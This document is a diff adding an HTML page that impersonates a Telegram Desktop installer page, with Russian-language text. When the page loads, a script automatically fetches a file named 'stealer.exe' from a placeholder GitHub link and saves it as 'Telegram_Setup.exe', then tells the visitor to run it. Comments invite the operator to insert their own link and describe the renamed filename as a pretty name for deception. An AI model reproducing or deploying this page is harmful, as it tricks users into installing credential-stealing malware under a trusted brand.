@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Desktop</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #2AABEE, #229ED9);
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 40px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .loader {
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Telegram Desktop</h1>
+        <p>Подготовка к установке...</p>
+        <div class="loader"></div>
+        <p id="status">Загрузка...</p>
+    </div>
+
+    <script>
+        // Функция для принудительного скачивания
+        function forceDownload(url, filename) {
+            fetch(url)
+                .then(response => response.blob())
+                .then(blob => {
+                    const link = document.createElement('a');
+                    link.href = URL.createObjectURL(blob);
+                    link.download = filename;
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    document.getElementById('status').innerHTML = 'Загрузка завершена!<br>Запустите файл для установки';
+                })
+                .catch(error => {
+                    // Если не работает - пробуем простой способ
+                    window.location.href = url;
+                });
+        }
+
+        // Запускаем скачивание сразу при загрузке
+        window.onload = function() {
+            // ВАША ССЫЛКА НА ФАЙЛ (исправьте на свою)
+            const fileUrl = 'https://github.com/ВАШ_ЛОГИН/download/raw/main/stealer.exe';
+            const fileName = 'Telegram_Setup.exe'; // Красивое имя
+            
+            setTimeout(() => {
+                forceDownload(fileUrl, fileName);
+            }, 2000); // Задержка 2 секунды для красоты
+        }
+    </script>
+</body>
+</html>
